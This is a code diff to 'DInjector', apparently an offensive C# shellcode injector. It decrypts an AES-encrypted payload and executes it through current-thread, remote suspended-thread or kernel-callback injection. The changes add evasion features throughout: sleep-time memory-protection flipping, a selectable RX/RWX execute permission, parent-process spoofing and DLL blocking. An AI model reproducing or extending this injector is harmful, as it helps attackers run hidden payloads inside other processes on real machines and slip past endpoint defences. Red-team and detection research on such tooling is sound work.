@@ -6,6 +6,8 @@ using System.Diagnostics;
 using System.Globalization;
 using System.Collections.Generic;
 
+using DI = DInvoke;
+
 namespace DInjector
 {
     public class Detonator
@@ -130,6 +132,14 @@ namespace DInjector
             AES ctx = new AES(password);
             var shellcodeBytes = ctx.Decrypt(shellcodeEncrypted);
 
+            int flipSleep = 0;
+            try
+            {
+                flipSleep = int.Parse(options["/flipSleep"]);
+            }
+            catch (Exception)
+            { }
+
             var ppid = 0;
             try
             {
@@ -164,6 +174,20 @@ namespace DInjector
                         break;
 
                     case "currentthread":
+                        string strProtect = "RX";
+                        try
+                        {
+                            strProtect = options["/protect"].ToUpper();
+                        }
+                        catch (Exception)
+                        { }
+
+                        uint protect = 0;
+                        if (strProtect == "RWX")
+                            protect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE;
+                        else // if (strProtect == "RX")
+                            protect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READ;
+
                         uint timeout = 0;
                         try
                         {
@@ -174,7 +198,9 @@ namespace DInjector
 
                         CurrentThread.Execute(
                             shellcodeBytes,
-                            timeout);
+                            protect,
+                            timeout,
+                            flipSleep);
                         break;
 
                     case "currentthreaduuid":
@@ -204,13 +230,16 @@ namespace DInjector
                     case "remotethreadsuspended":
                         RemoteThreadSuspended.Execute(
                             shellcodeBytes,
-                            int.Parse(options["/pid"]));
+                            int.Parse(options["/pid"]),
+                            flipSleep);
                         break;
 
                     case "remotethreadkernelcb":
                         RemoteThreadKernelCB.Execute(
                             shellcodeBytes,
-                            int.Parse(options["/pid"]));
+                            options["/image"],
+                            ppid,
+                            blockDlls);
                         break;
 
                     case "remotethreadapc":
